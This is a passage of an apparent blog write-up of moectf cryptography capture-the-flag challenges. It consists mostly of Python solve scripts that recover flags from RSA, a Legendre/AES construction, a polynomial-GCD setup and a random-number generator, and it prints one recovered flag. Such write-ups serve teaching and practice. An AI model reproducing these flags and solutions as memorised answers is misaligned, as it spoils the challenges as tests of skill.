class="number">1</span>, phi)</span><br><span class="line">    m = <span class="built_in">pow</span>(c, d, n)</span><br><span class="line">    flag = m.to_bytes((m.bit_length() + <span class="number">7</span>) // <span class="number">8</span>, <span class="string">&#x27;big&#x27;</span>)</span><br><span class="line">    <span class="built_in">print</span>(flag.decode())</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Not a perfect square&quot;</span>)</span><br><span class="line"> </span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br></pre></td></tr></table></figure>

<h3 id="7-Ledengre-revenge"><a href="#7-Ledengre-revenge" class="headerlink" title="7.Ledengre_revenge"></a>7.<strong>Ledengre_revenge</strong></h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Cryptodome.Cipher <span class="keyword">import</span> AES</span><br><span class="line"><span class="keyword">from</span> Cryptodome.Util.number <span class="keyword">import</span> bytes_to_long, long_to_bytes</span><br><span class="line"><span class="keyword">import</span> copy</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">function</span>(<span class="params">x, p</span>):</span><br><span class="line">    <span class="keyword">if</span> x &gt;= p:</span><br><span class="line">        y = x</span><br><span class="line">    <span class="keyword">elif</span> <span class="built_in">pow</span>(x, (p-<span class="number">1</span>)//<span class="number">2</span>, p) == <span class="number">1</span>:</span><br><span class="line">        y = <span class="built_in">pow</span>(x, <span class="number">2</span>, p)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        y = <span class="built_in">pow</span>(x, <span class="number">3</span>, p)</span><br><span class="line">    <span class="keyword">return</span> y</span><br><span class="line"></span><br><span class="line">p_ = <span class="number">71583805456773770888820224577418671344500223401233301642692926000191389937709</span></span><br><span class="line">key = <span class="number">60679</span></span><br><span class="line">aes_key = long_to_bytes(key &lt;&lt; <span class="number">107</span>)</span><br><span class="line">cipher = AES.new(aes_key, AES.MODE_ECB)</span><br><span class="line"></span><br><span class="line">a = [[<span class="number">239</span>, <span class="number">239</span>, <span class="number">251</span>, <span class="number">239</span>], [<span class="number">233</span>, <span class="number">227</span>, <span class="number">233</span>, <span class="number">251</span>], [<span class="number">251</span>, <span class="number">239</span>, <span class="number">251</span>, <span class="number">233</span>], [<span class="number">233</span>, <span class="number">227</span>, <span class="number">251</span>, <span class="number">233</span>]]</span><br><span class="line"></span><br><span class="line">primes = <span class="built_in">set</span>(<span class="built_in">sum</span>(a, [])) | &#123;<span class="number">251</span>&#125;</span><br><span class="line"></span><br><span class="line">dict_pr_inv = &#123;&#125;</span><br><span class="line"><span class="keyword">for</span> pr <span class="keyword">in</span> primes:</span><br><span class="line">    inv = [[] <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">256</span>)]</span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">256</span>):</span><br><span class="line">        y = function(x, pr)</span><br><span class="line">        inv[y].append(x)</span><br><span class="line">    dict_pr_inv[pr] = inv</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">reverse_half</span>(<span class="params">current, lis_input, a, dict_pr_inv, cipher</span>):</span><br><span class="line">    lis = copy.deepcopy(lis_input)</span><br><span class="line">    <span class="keyword">for</span> round_num <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>):</span><br><span class="line">        bit_matrix = [[ (lis[row][col] &amp; <span class="number">1</span>) <span class="keyword">for</span> col <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>)] <span class="keyword">for</span> row <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>)]</span><br><span class="line">        <span class="keyword">for</span> row <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>):</span><br><span class="line">            <span class="keyword">for</span> col <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>):</span><br><span class="line">                lis[row][col] //= <span class="number">2</span></span><br><span class="line">        new_S = [[<span class="number">0</span> <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>)] <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>)]</span><br><span class="line">        <span class="keyword">for</span> row <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>):</span><br><span class="line">            <span class="keyword">for</span> col <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>):</span><br><span class="line">                new_S[row][col] = current[row + <span class="number">4</span> * col]</span><br><span class="line">        temp_S = [[<span class="number">0</span> <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>)] <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>)]</span><br><span class="line">        <span class="keyword">for</span> row <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>):</span><br><span class="line">            <span class="keyword">for</span> col <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>):</span><br><span class="line">                p2 = a[col][row]</span><br><span class="line">                target = new_S[row][col]</span><br><span class="line">                possibles = dict_pr_inv[p2][target]</span><br><span class="line">                filtered = []</span><br><span class="line">                <span class="keyword">for</span> x <span class="keyword">in</span> possibles:</span><br><span class="line">                    greater = <span class="number">1</span> <span class="keyword">if</span> x &gt; (p2 // <span class="number">2</span>) <span class="keyword">else</span> <span class="number">0</span></span><br><span class="line">                    <span class="keyword">if</span> greater == bit_matrix[col][row]:</span><br><span class="line">                        filtered.append(x)</span><br><span class="line">                <span class="keyword">if</span> <span class="built_in">len</span>(filtered) != <span class="number">1</span>:</span><br><span class="line">                    <span class="built_in">print</span>(<span class="string">f&quot;Multiple or no possibilities at row <span class="subst">&#123;row&#125;</span>, col <span class="subst">&#123;col&#125;</span>, round <span class="subst">&#123;round_num&#125;</span>: <span class="subst">&#123;filtered&#125;</span>, target=<span class="subst">&#123;target&#125;</span>, p2=<span class="subst">&#123;p2&#125;</span>&quot;</span>)</span><br><span class="line">                    <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line">                temp_S[row][col] = filtered[<span class="number">0</span>]</span><br><span class="line">        enc_S = [[<span class="number">0</span> <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>)] <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>)]</span><br><span class="line">        <span class="keyword">for</span> row <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>):</span><br><span class="line">            <span class="keyword">for</span> col <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>):</span><br><span class="line">                target = temp_S[row][col]</span><br><span class="line">                possibles = dict_pr_inv[<span class="number">251</span>][target]</span><br><span class="line">                <span class="keyword">if</span> <span class="keyword">not</span> possibles:</span><br><span class="line">                    <span class="built_in">print</span>(<span class="string">f&quot;No possibilities for target <span class="subst">&#123;target&#125;</span> with p=251 at row <span class="subst">&#123;row&#125;</span>, col <span class="subst">&#123;col&#125;</span>, round <span class="subst">&#123;round_num&#125;</span>&quot;</span>)</span><br><span class="line">                    <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line">                enc_S[row][col] = possibles[<span class="number">0</span>]</span><br><span class="line">        enc = <span class="built_in">bytes</span>([enc_S[row][col] <span class="keyword">for</span> col <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>) <span class="keyword">for</span> row <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>)])</span><br><span class="line">        current = cipher.decrypt(enc)</span><br><span class="line">    <span class="keyword">return</span> current</span><br><span class="line"></span><br><span class="line">lis0 = [[<span class="number">341</span>, <span class="number">710</span>, <span class="number">523</span>, <span class="number">1016</span>], [<span class="number">636</span>, <span class="number">366</span>, <span class="number">441</span>, <span class="number">790</span>], [<span class="number">637</span>, <span class="number">347</span>, <span class="number">728</span>, <span class="number">426</span>], [<span class="number">150</span>, <span class="number">184</span>, <span class="number">421</span>, <span class="number">733</span>]]</span><br><span class="line">lis1 = [[<span class="number">133</span>, <span class="number">301</span>, <span class="number">251</span>, <span class="number">543</span>], [<span class="number">444</span>, <span class="number">996</span>, <span class="number">507</span>, <span class="number">1005</span>], [<span class="number">18</span>, <span class="number">902</span>, <span class="number">379</span>, <span class="number">878</span>], [<span class="number">235</span>, <span class="number">448</span>, <span class="number">836</span>, <span class="number">263</span>]]</span><br><span class="line"></span><br><span class="line">ms = [<span class="number">30565192635368786249732024567787542864212990230048954769681860484383995323228</span>, <span class="number">41018612821404984639088200009631128480287233171184346873011065515807394614481</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> m <span class="keyword">in</span> ms:</span><br><span class="line">    final_concat = long_to_bytes(m)</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(final_concat) != <span class="number">32</span>:</span><br><span class="line">        final_concat = <span class="string">b&#x27;\x00&#x27;</span> * (<span class="number">32</span> - <span class="built_in">len</span>(final_concat)) + final_concat</span><br><span class="line">    text0 = final_concat[:<span class="number">16</span>]</span><br><span class="line">    text1 = final_concat[<span class="number">16</span>:]</span><br><span class="line">    flag0 = reverse_half(text0, lis0, a, dict_pr_inv, cipher)</span><br><span class="line">    <span class="keyword">if</span> flag0 <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;Failed to decrypt text0 for m=<span class="subst">&#123;m&#125;</span>&quot;</span>)</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    flag1 = reverse_half(text1, lis1, a, dict_pr_inv, cipher)</span><br><span class="line">    <span class="keyword">if</span> flag1 <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;Failed to decrypt text1 for m=<span class="subst">&#123;m&#125;</span>&quot;</span>)</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    flag = flag0 + flag1</span><br><span class="line">    computed_key = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> col <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>):</span><br><span class="line">        <span class="keyword">for</span> row <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>):</span><br><span class="line">            idx = row + col * <span class="number">4</span></span><br><span class="line">            v = bytes_to_long(flag[idx*<span class="number">2</span> : idx*<span class="number">2</span> + <span class="number">2</span>])</span><br><span class="line">            w = <span class="built_in">pow</span>(v, -<span class="number">2</span>, p_) + <span class="number">1</span></span><br><span class="line">            leg = <span class="built_in">pow</span>(w, (p_-<span class="number">1</span>)//<span class="number">2</span>, p_)</span><br><span class="line">            bit = ((leg + <span class="number">1</span>) % p_ // <span class="number">2</span>)</span><br><span class="line">            computed_key = computed_key * <span class="number">2</span> + bit</span><br><span class="line">    <span class="keyword">if</span> computed_key == key:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;Flag:&quot;</span>, flag)</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;Computed key <span class="subst">&#123;computed_key&#125;</span> does not match expected key <span class="subst">&#123;key&#125;</span> for m=<span class="subst">&#123;m&#125;</span>&quot;</span>) <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">        Flag: b&#x27;moectf&#123;E@5Y_1eGendre_@nd_@ES*10&#125;&#x27;</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br></pre></td></tr></table></figure>

<h3 id="8-easy-gcd"><a href="#8-easy-gcd" class="headerlink" title="8.easy_gcd"></a>8.easy_gcd</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Cryptodome.Util.number <span class="keyword">import</span> long_to_bytes</span><br><span class="line"><span class="keyword">from</span> math <span class="keyword">import</span> gcd</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">trim_poly</span>(<span class="params">p</span>):</span><br><span class="line">    <span class="keyword">while</span> <span class="built_in">len</span>(p) &gt; <span class="number">0</span> <span class="keyword">and</span> p[-<span class="number">1</span>] == <span class="number">0</span>:</span><br><span class="line">        p.pop()</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">poly_mul</span>(<span class="params">a, b, n</span>):</span><br><span class="line">    res = [<span class="number">0</span>] * (<span class="built_in">len</span>(a) + <span class="built_in">len</span>(b) - <span class="number">1</span>)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(a)):</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(b)):</span><br><span class="line">            res[i + j] = (res[i + j] + a[i] * b[j]) % n</span><br><span class="line">    trim_poly(res)</span><br><span class="line">    <span class="keyword">return</span> res</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">poly_div</span>(<span class="params">dividend, divisor, n</span>):</span><br><span class="line">    dividend = dividend[:]</span><br><span class="line">    divisor = divisor[:]</span><br><span class="line">    trim_poly(dividend)</span><br><span class="line">    trim_poly(divisor)</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(divisor) == <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">raise</span> ValueError(<span class="string">&quot;Division by zero polynomial&quot;</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(dividend) &lt; <span class="built_in">len</span>(divisor):</span><br><span class="line">        <span class="keyword">return</span> [<span class="number">0</span>], dividend</span><br><span class="line">    q = [<span class="number">0</span>] * (<span class="built_in">len</span>(dividend) - <span class="built_in">len</span>(divisor) + <span class="number">1</span>)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(dividend) - <span class="built_in">len</span>(divisor), -<span class="number">1</span>, -<span class="number">1</span>):</span><br><span class="line">        base = divisor[-<span class="number">1</span>]</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            inv = <span class="built_in">pow</span>(base, -<span class="number">1</span>, n)</span><br><span class="line">            coeff = (dividend[i + <span class="built_in">len</span>(divisor) - <span class="number">1</span>] * inv) % n</span><br><span class="line">        <span class="keyword">except</span> ValueError:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;Inverse failed, attempting to factor n...&quot;</span>)</span><br><span class="line">            g = gcd(base, n)</span><br><span class="line">            <span class="keyword">if</span> <span class="number">1</span> &lt; g &lt; n:</span><br><span class="line">                p = g</span><br><span class="line">                q = n // p</span><br><span class="line">                phi_calc = (p - <span class="number">1</span>) * (q - <span class="number">1</span>)</span><br><span class="line">                <span class="keyword">if</span> <span class="built_in">pow</span>(phi_calc, e, n) == enc_phi:</span><br><span class="line">                    <span class="built_in">print</span>(<span class="string">&quot;Phi verified&quot;</span>)</span><br><span class="line">                    d_calc = <span class="built_in">pow</span>(e, -<span class="number">1</span>, phi_calc)</span><br><span class="line">                    <span class="keyword">if</span> <span class="built_in">pow</span>(d_calc, e, n) == enc_d:</span><br><span class="line">                        <span class="built_in">print</span>(<span class="string">&quot;D verified&quot;</span>)</span><br><span class="line">                        flag_int = <span class="built_in">pow</span>(enc_flag, d_calc, n)</span><br><span class="line">                        flag = long_to_bytes(flag_int)</span><br><span class="line">                        <span class="built_in">print</span>(<span class="string">&quot;Flag:&quot;</span>, flag)</span><br><span class="line">                    <span class="keyword">else</span>:</span><br><span class="line">                        <span class="built_in">print</span>(<span class="string">&quot;D not verified&quot;</span>)</span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    <span class="built_in">print</span>(<span class="string">&quot;Phi not verified&quot;</span>)</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&quot;Invalid factor, base=&quot;</span>, base)</span><br><span class="line">            <span class="keyword">import</span> sys</span><br><span class="line">            sys.exit(<span class="number">0</span>)</span><br><span class="line">        q[i] = coeff</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(divisor)):</span><br><span class="line">            dividend[i + j] = (dividend[i + j] - coeff * divisor[j]) % n</span><br><span class="line">    trim_poly(dividend)</span><br><span class="line">    <span class="keyword">return</span> q, dividend</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">poly_gcd</span>(<span class="params">f, g, n</span>):</span><br><span class="line">    f = f[:]</span><br><span class="line">    g = g[:]</span><br><span class="line">    trim_poly(f)</span><br><span class="line">    trim_poly(g)</span><br><span class="line">    <span class="keyword">while</span> <span class="built_in">len</span>(g) &gt; <span class="number">0</span>:</span><br><span class="line">        q, r = poly_div(f, g, n)</span><br><span class="line">        f = g</span><br><span class="line">        g = r</span><br><span class="line">        trim_poly(g)</span><br><span class="line">    <span class="keyword">return</span> f</span><br><span class="line"></span><br><span class="line">e = <span class="number">11</span></span><br><span class="line">n = <span class="number">31166099657280475125475535365831782783093875463247358362475188588947278779261659087382153841735341294644470135658242563894811427195085499234687959821014213884097144683916979145688501653937652132196507641706592058541461494851978378234097501450088696202067780458185699118745693112795064523774316076900622924515043087514299819363383005261432426124907190050031873969718731577577610423430342011833399812571330259167141343053584093492407110726050289284883569075898031613703838488237576756303655189545592872431914967027530453720947545137077577544615857606624432667091058064432254815560483584621525418467954592836937243988243</span></span><br><span class="line">enc_d = <span class="number">13808910452602719582082356538103809869422886228259509560372242093772427733416618401205696740074353028623820317050192627491660359558892392153999532272857339481298482802886251848703046960504786528793589170539584003383632027476914361574273144291330585735179166690513545471901763697269194228467287645573188775899890375853801796593582850975578804671547453457528686518397397234277841944184055117669277697362945463508844599947716337314398521363079749738943908860398843430518505690528296941997988869732759053587554475692300841912141199296010163641185664377742397777941968394746150611710777000625916609542525700860321528867212</span></span><br><span class="line">enc_phi = <span class="number">7712799451523923934297438340493818709638100911475880659269081521797448094000671886662453371669377561442768781648787281763679814952312810588749220640616349121013802986627369725105748412428708271146640375251603852154891826036699121824706508396445679193881511426962350499448921650925902083009038656420224517990418144263810608916613943703387804258988710100695100014625921151006914635066745373266932452264209581055597451243351753611834270245107587926127995770837997657200564139159783438755362906511732933456755615781562673235575025697927723044975521898510169824612319133648292886516647301360818651593931313229819219102145</span></span><br><span class="line">enc_flag = <span class="number">894510730103475572849584456948777906177928458037601077973815297094718207962800841050676989919558783959100151883021776468599378605624814726543232609670826195546342526501910728018180564277901156145145431115589678554941920392777979439329210254339330200637295639957614541733453280727879958971862238162005775966684182859139832583501267115086918765938983728386252082360729694525611252282765144977858082339098241367689924035089953114271269967974794791094625994785638389602317004891381734713155429498571328372671258967340771255624802290579938944569672935599910907961053536945947262426210286500553262856689698523083914877686</span></span><br><span class="line"></span><br><span class="line">f = [<span class="number">0</span>] * (e + <span class="number">1</span>)</span><br><span class="line">f[<span class="number">0</span>] = (-enc_d) % n</span><br><span class="line">f[e] = <span class="number">1</span></span><br><span class="line">trim_poly(f)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">11</span>):</span><br><span class="line">    poly = [<span class="number">1</span>]</span><br><span class="line">    <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(e):</span><br><span class="line">        poly = poly_mul(poly, [(-<span class="number">1</span>) % n, e % n], n)</span><br><span class="line">    ke = <span class="built_in">pow</span>(k, e, n)</span><br><span class="line">    enc_phi_k = (ke * enc_phi) % n</span><br><span class="line">    poly[<span class="number">0</span>] = (poly[<span class="number">0</span>] - enc_phi_k) % n</span><br><span class="line">    trim_poly(poly)</span><br><span class="line">    gcd_poly = poly_gcd(f, poly, n)</span><br><span class="line">    trim_poly(gcd_poly)</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(gcd_poly) == <span class="number">2</span>:</span><br><span class="line">        lead = gcd_poly[<span class="number">1</span>]</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            inv_lead = <span class="built_in">pow</span>(lead, -<span class="number">1</span>, n)</span><br><span class="line">        <span class="keyword">except</span> ValueError:</span><br><span class="line">            g = gcd(lead, n)</span><br><span class="line">            <span class="keyword">if</span> <span class="number">1</span> &lt; g &lt; n:</span><br><span class="line">                p = g</span><br><span class="line">                q = n // p</span><br><span class="line">                phi_calc = (p - <span class="number">1</span>) * (q - <span class="number">1</span>)</span><br><span class="line">                <span class="keyword">if</span> <span class="built_in">pow</span>(phi_calc, e, n) == enc_phi:</span><br><span class="line">                    d_calc = <span class="built_in">pow</span>(e, -<span class="number">1</span>, phi_calc)</span><br><span class="line">                    <span class="keyword">if</span> <span class="built_in">pow</span>(d_calc, e, n) == enc_d:</span><br><span class="line">                        flag_int = <span class="built_in">pow</span>(enc_flag, d_calc, n)</span><br><span class="line">                        flag = long_to_bytes(flag_int)</span><br><span class="line">                        <span class="built_in">print</span>(<span class="string">&quot;Flag:&quot;</span>, flag)</span><br><span class="line">                    <span class="keyword">else</span>:</span><br><span class="line">                        <span class="built_in">print</span>(<span class="string">&quot;D not verified&quot;</span>)</span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    <span class="built_in">print</span>(<span class="string">&quot;Phi not verified&quot;</span>)</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&quot;Invalid factor for lead&quot;</span>)</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        const = (gcd_poly[<span class="number">0</span>] * inv_lead) % n</span><br><span class="line">        d = (-const) % n</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">pow</span>(d, e, n) == enc_d:</span><br><span class="line">            flag_int = <span class="built_in">pow</span>(enc_flag, d, n)</span><br><span class="line">            flag = long_to_bytes(flag_int)</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;Flag:&quot;</span>, flag)</span><br><span class="line">            <span class="keyword">break</span></span><br></pre></td></tr></table></figure>

<h3 id="9-æ‚äº¤éšæœºæ•°"><a href="#9-æ‚äº¤éšæœºæ•°" class="headerlink" title="9.æ‚äº¤éšæœºæ•°"></a>9.<strong>æ‚äº¤éšæœºæ•°</strong></h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">l = <span class="number">116</span></span><br><span class="line">m = <span class="number">1</span> &lt;&lt; l</span><br><span class="line">a = -<span class="number">233</span></span><br><span class="line">a_mod = a % m</span><br><span class="line">inv_a = <span class="built_in">pow</span>(a_mod, -<span class="number">1</span>, m)</span><br><span class="line">N = <span class="number">4567941593066862873653209393990031966807270114415459425382356207107640</span></span><br><span class="line">curr_L_int = N &gt;&gt; l</span><br><span class="line">curr_R_int = N &amp; (m - <span class="number">1</span>)</span><br><span class="line">stack = [(curr_L_int, curr_R_int, <span class="number">0</span>)]</span><br><span class="line"><span class="keyword">while</span> stack:</span><br><span class="line">    L_int, R_int, steps = stack.pop()</span><br><span class="line">    <span class="keyword">if</span> steps == <span class="number">2025</span>:</span><br><span class="line">        original_int = (L_int &lt;&lt; l) | R_int</span><br><span class="line">        flag_bytes = original_int.to_bytes(<span class="number">29</span>, <span class="string">&#x27;big&#x27;</span>)</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            flag = flag_bytes.decode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">            <span class="keyword">if</span> flag.startswith(<span class="string">&#x27;moectf&#123;&#x27;</span>) <span class="keyword">and</span> flag.endswith(<span class="string">&#x27;&#125;&#x27;</span>):</span><br><span class="line">                <span class="built_in">print</span>(flag)</span><br><span class="line">        <span class="keyword">except</span> UnicodeDecodeError:</span><br><span class="line">            <span class="keyword">pass</span></span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    S = 